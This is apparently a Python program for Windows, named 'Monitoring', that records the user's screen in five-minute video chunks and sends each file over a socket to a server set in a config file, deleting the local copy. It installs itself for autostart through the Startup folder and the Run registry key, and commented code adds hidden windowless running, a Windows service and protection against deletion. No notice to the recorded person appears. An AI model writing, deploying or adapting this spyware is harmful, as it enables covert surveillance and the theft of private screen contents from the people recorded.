import datetime  
import socket
import os
import struct
import sys
import cv2
import numpy as np  #pip install numpy
import cv2 as cv    #pip install opencv-python
import pyautogui    #pip install PyAutoGUI
from os import walk
import shutil
import winreg
from pywinauto import Application
from dotenv import dotenv_values
global server_ip,user_name

# config = dotenv_values('.env')

# # Access environment variables
# SERVER_IP = config['SERVER_IP']
# USER_NAME = config['USER_NAME']

# # Print the values
# print(f"SERVER_IP: {SERVER_IP}")
# print(f": {USER_NAME}")


# automatically running windows...
# __script_path = os.path.realpath(__file__)
# app = Application().start("pythonw.exe " + __script_path)
# script_start_path = os.path.realpath(__file__)
# script_start_path = sys.executable
# subprocess.Popen([script_start_path], creationflags=subprocess.CREATE_NO_WINDOW)

# Find the time for name
# class MyService(win32serviceutil.ServiceFramework):
#     _svc_name_ = 'MyService'
#     _svc_display_name_ = 'My Service'

#     def __init__(self, args):
#         win32serviceutil.ServiceFramework.__init__(self, args)
#         self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
#         socket.setdefaulttimeout(60)
#         self.is_running = True

#     def SvcStop(self):
#         self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
#         win32event.SetEvent(self.hWaitStop)
#         self.is_running = False

#     def SvcDoRun(self):
#         servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
#                               servicemanager.PYS_SERVICE_STARTED,
#                               (self._svc_name_, ''))
#         self.main()

#     def main(self):
#         # Your program's logic goes here
#         while self.is_running:
#             # Do something
#             pass

# if __name__ == '__main__':
#     if len(sys.argv) == 1:
#         servicemanager.Initialize()
#         servicemanager.PrepareToHostSingle(MyService)
#         servicemanager.StartServiceCtrlDispatcher()
#     else:
#         win32serviceutil.HandleCommandLine(MyService)
def find_time():
    x = datetime.datetime.now()
    date_for_name = (x.strftime("%d") + "-" + x.strftime("%m") + "-" + x.strftime("%Y") + "-" + x.strftime("%H") + "-" +
                     x.strftime("%M") + "-" + x.strftime("%S"))
    return date_for_name

def send(screen, currtime, idletime, filename, username):
    sock = socket.socket()
    sock.settimeout(60)
    try:
        sock.connect((server_ip, 56230))
        sock.sendall(struct.pack('<QQ64s64sI', 111, 222, filename.encode('utf-8'), username.encode('utf-8'), len(screen)))
        sock.sendall(screen)
        sock.close()
        os.remove( directory+filename )
        print('send file success...')
        video_record()
    except:
        print("coonect failed")
    
def video_record():
    create_time = find_time()
    create_time_dt = datetime.datetime.strptime(create_time, "%d-%m-%Y-%H-%M-%S")
    
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    output = cv2.VideoWriter(directory +user_name+ " " + find_time() + ".avi", fourcc, 20.0, (screen_width, screen_height))
    while True:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        output.write(frame)
        # cv2.imshow("Screen Recording", frame)
        
        current_time = datetime.datetime.now()
        difference_minutes = (current_time - create_time_dt).total_seconds() / 60
        if difference_minutes > 5:
            break
    output.release()
    cv2.destroyAllWindows()
    into_server(create_time_dt)

def add_to_startup():
    script_path = os.path.realpath(__file__)
    # script_path = sys.executable
    script_name = "Monitoring"
    print(script_path)
    print('setting automatically...')
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Copy the script to the Startup folder
    if not os.path.exists(os.path.join(startup_folder, "main.py")):
        # Copy the script to the Startup folder
        shutil.copy2(script_path, startup_folder)
    else:
        print("main.py already exists in the startup folder.")
    # Create a shortcut to the script
    shortcut_path = os.path.join(startup_folder, f"{script_name}.lnk")
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
        winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, shortcut_path)
        
def add_login_startup(file_path):
    # Open the registry key for the current user's startup folder
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)

    # Set the path to your Python executable file
    exe_path = os.path.abspath(file_path)

    # Add the executable to the startup folder
    winreg.SetValueEx(key, "MyProgram", 0, winreg.REG_SZ, exe_path)

    # Close the registry key
    winreg.CloseKey(key)

# def prevent_deletion():
#     # Get the path of the current script
#     script_delete_path = sys.argv[0]
#     # Get the absolute path of the script
#     abs_path = os.path.abspath(script_delete_path)
#     # Set the file attributes to read-only
#     try:
#         os.chmod(abs_path, 0o444)
#         print("File set to read-only. Deletion prevented.")
#     except OSError as e:
#         print(f"Error: {e}")

# prevent_deletion()     
def into_server(create_time_dt):
    files = os.listdir(directory)
    print(type(create_time_dt))
    print(create_time_dt)
    formatted_str = create_time_dt.strftime("%d-%m-%Y-%H-%M-%S")
    for file in files:
        print('found directory...')
        print(formatted_str)
        _file_found = file.split(' ')
        print(_file_found[1])
        # if _file_found[1].split('.')[0] == formatted_str :
        print('record success...')
        imgfp = open(directory+file, 'rb')
        imgdata = imgfp.read()
        imgfp.close()
        send(imgdata, find_time(), find_time(), file, user_name)
def create_result_directory():
    global directory
    directory = "C:\\Users/Public/Result_Output/"
    if os.path.exists(directory):
        pass
    else:
        os.makedirs(directory)

def start_monitoring():
    while True:
        add_to_startup()
        create_result_directory()
        print('++++++++++++++++++++++')
        video_record()
status = True
while status:
    with open('setting.conf', 'r') as file:
        for line in file:
            if line.startswith('SERVER_IP'):
                server_ip = line.split('=')[1].strip()
            elif line.startswith('USER_NAME'):
                user_name = line.split('=')[1].strip()
    if server_ip == '' or user_name == '':
        status = True
    else :
        status = False
        start_monitoring()
    print(f"SERVER_IP: {server_ip}")
    print(f"USER_NAME: {user_name}")